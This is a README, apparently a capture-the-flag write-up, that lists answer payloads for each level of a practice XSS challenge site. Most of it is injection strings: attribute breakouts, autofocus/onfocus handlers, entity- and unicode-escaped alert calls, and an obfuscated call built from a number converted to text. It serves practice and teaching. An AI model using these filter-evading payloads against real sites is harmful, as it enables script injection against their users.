
# 🚨 Solutions of XSS Challenges of http://sudo.co.il/xss/

---
## 🎯 Goal for CTFs:

**Our goal is to trigger a popup displaying  — all without requiring any user interaction! 🚫🖱️**


## ## 🔓 Challenge Solutions

- Level 0 🧪
```
<img src=1 onerror=alert(document.domain)>
```
- Level 1🧪
```
"><img src=1 onerror=alert(document.domain)>
```

- Level 2 🧪
```
" autofocus onfocus=alert(1) x="
```
- Level 3 🧪
```
"autofocus/onfocus="alert(document.domain)
```

- Level 4 🧪
```
"autofocus/onfocus="&#x61;lert&#x28;document.domain&#x29;
```

- Level 5.1 🧪
```
'-alert(document.domain);<!--
```
- Level 5.2 🧪
```
\'-alert(1);<!--
```
- Level 6 🧪
```
\'-alert(document.domain);//
```
- Level 7 🧪
```
" autofocus onfocus=alert(1) x="    #like 2
```
- Level 8 🧪
```
this[8680439..toString(30)](document.domain)
```
- Level 8.1 🧪
```
"};this[8680439..toString(30)](document.domain);{"
```
- Level 9 🧪
```
"};this[8680439..toString(30)](document.domain);{"
```
- Level 10 🧪
```
';this[8680439..toString(30)](document.domain);'
```

- Level 11 🧪
```
#<script>alert(document.domain)</script>
```
🧨 Level 12 — External Payload Injection

📎 Go to: http://untrusted.sudo.co.il/iframe.php?p=

Paste the following encoded payload:

%27%3Bal%5Cu0065rt%28m%29%3B%2F%2F

🔗 Final link:

http://untrusted.sudo.co.il/iframe.php?p=%27%3Bal%5Cu0065rt%28m%29%3B%2F%2F

---
### 👨‍💻 Author
💻 Made with ❤️ by Bruno (aka XSS Hunter)





